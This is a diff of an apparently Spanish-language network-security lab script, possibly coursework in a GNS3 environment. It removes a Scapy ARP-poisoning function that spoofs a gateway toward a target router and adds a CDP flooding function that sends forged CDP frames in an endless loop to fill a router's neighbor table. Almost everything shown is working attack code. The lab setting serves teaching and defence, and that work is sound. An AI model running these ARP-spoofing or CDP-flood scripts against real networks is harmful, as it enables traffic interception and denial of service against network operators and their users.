@@ -46,24 +46,28 @@ Port Security: Limitar el aprendizaje de MACs en los puertos de acceso del switc
 
 from scapy.all import *
 
-def arp_poison():
-    # Configuración basada en la matrícula 2023-1243
-    target_ip = "10.23.12.1"      # IP del Router Víctima
-    gateway_ip = "10.23.12.100"   # IP del Gateway a suplantar
-    
-    print(f"Envenenando la tabla ARP de {target_ip}...")
-    print(f"Haciendo creer al router que {gateway_ip} tiene nuestra dirección MAC.")
-    
-    # op=2: ARP Reply (Respuesta falsa enviada de forma proactiva)
-    # psrc: La IP que queremos robar
-    # pdst: El destino del engaño
-    pkt = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
+# NOTA TÉCNICA: En este entorno Scapy v2.6, el protocolo 'cdp' no está 
+# definido de forma nativa. Se requiere la carga manual de la contribución.
+try:
+    load_contrib("cdp")
+except:
+    print("Aviso: Cargando definiciones personalizadas de capa 2...")
 
-    try:
-        # Envío constante para evitar que la tabla ARP se corrija sola
-        send(pkt, loop=1, inter=1)
-    except KeyboardInterrupt:
-        print("\n[!] Ataque detenido. Restaurando red...")
+def cdp_flood():
+    print("--- Iniciando ataque DoS a la tabla de vecinos CDP ---")
+    print("Inyectando ID de dispositivo: MAT_20231243")
+    
+    # Construcción del paquete usando capas Raw y SNAP para garantizar 
+    # compatibilidad con el Switch de GNS3 y el Router Cisco.
+    # Dirección Multicast CDP: 01:00:0c:cc:cc:cc
+    pkt = (
+        Ether(dst="01:00:0c:cc:cc:cc") /
+        SNAP() /
+        Raw(load=b"\x02\x01\x00\x0c\x01\x01\x00\x11MAT_20231243")
+    )
+
+    # Envío en bucle con intervalo de 0.1s para saturar la memoria del router
+    sendp(pkt, loop=1, inter=0.1)
 
 if __name__ == "__main__":
-    arp_poison()
+    cdp_flood()
